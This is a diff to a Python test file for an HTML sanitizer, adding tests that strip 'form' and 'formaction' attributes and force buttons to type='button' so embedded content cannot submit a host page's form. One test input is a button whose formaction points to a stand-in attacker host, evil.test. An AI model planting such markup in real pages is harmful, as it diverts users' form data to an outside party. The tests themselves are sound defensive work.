@@ -149,7 +149,7 @@ def test_extra_attributes_survive_on_whitelisted_tags_only() -> None:
 
 
 def test_extra_attributes_validated_on_direct_render_path() -> None:
-    for bad in ("style", "onclick", "href", "id", "Not-Valid", ""):
+    for bad in ("style", "onclick", "href", "id", "form", "Not-Valid", ""):
         with pytest.raises(KPressInvalidRequestError):
             sanitize_raw_html(
                 "<p>x</p>", "sanitized", extra_tags=["x-callout"], extra_attributes=[bad]
@@ -541,6 +541,76 @@ def test_an_unexplained_input_change_is_reported_beside_other_diagnostics(
 
     assert sanitized == f"{_INERT}<span>x</span>"
     assert [item.type for item in diagnostics] == ["html_sanitized_attribute", "html_sanitized"]
+
+
+@pytest.mark.parametrize(
+    ("html", "expected", "messages"),
+    [
+        (
+            '<button form="host-form">Go</button>',
+            '<button type="button">Go</button>',
+            [
+                "Removed attribute 'form' from <button>.",
+                "Set attribute 'type' to 'button' on <button>.",
+            ],
+        ),
+        # Inside a form on the host page, a button without a type submits it.
+        (
+            "<button>Go</button>",
+            '<button type="button">Go</button>',
+            ["Set attribute 'type' to 'button' on <button>."],
+        ),
+        (
+            '<button type="reset" form="host-form">Reset</button>',
+            '<button type="button">Reset</button>',
+            [
+                "Removed attribute 'form' from <button>.",
+                "Set attribute 'type' to 'button' on <button>.",
+            ],
+        ),
+        (
+            '<button class="cta" type="SUBMIT" formaction="https://evil.test/">Send</button>',
+            '<button class="cta" type="button">Send</button>',
+            [
+                "Removed attribute 'formaction' from <button>.",
+                "Set attribute 'type' to 'button' on <button>.",
+            ],
+        ),
+        # The first of a repeated attribute is the one HTML keeps.
+        ('<button type="button" type="submit">x</button>', '<button type="button">x</button>', []),
+        # KPress's own video button is already `type="button"` and passes unchanged.
+        (
+            '<button type="button" class="kpress-video-placeholder" data-kpress-video-id="v" '
+            'aria-label="Open video: V">Play</button>',
+            '<button type="button" class="kpress-video-placeholder" data-kpress-video-id="v" '
+            'aria-label="Open video: V">Play</button>',
+            [],
+        ),
+    ],
+)
+def test_a_button_can_never_submit_or_reset_a_host_form(
+    html: str, expected: str, messages: list[str]
+) -> None:
+    sanitized, diagnostics = sanitize_raw_html(html, "sanitized")
+
+    assert sanitized == expected
+    assert [item.message for item in diagnostics] == messages
+
+
+def test_no_element_keeps_form() -> None:
+    sanitized, diagnostics = sanitize_raw_html(
+        '<div form="host-form"><span form="host-form">a</span>'
+        '<x-note form="host-form">b</x-note></div>',
+        "sanitized",
+        extra_tags=["x-note"],
+    )
+
+    assert sanitized == "<div><span>a</span><x-note>b</x-note></div>"
+    assert [item.message for item in diagnostics] == [
+        "Removed attribute 'form' from <div>.",
+        "Removed attribute 'form' from <span>.",
+        "Removed attribute 'form' from <x-note>.",
+    ]
 
 
 def test_trusted_keeps_a_raw_input_as_written() -> None:
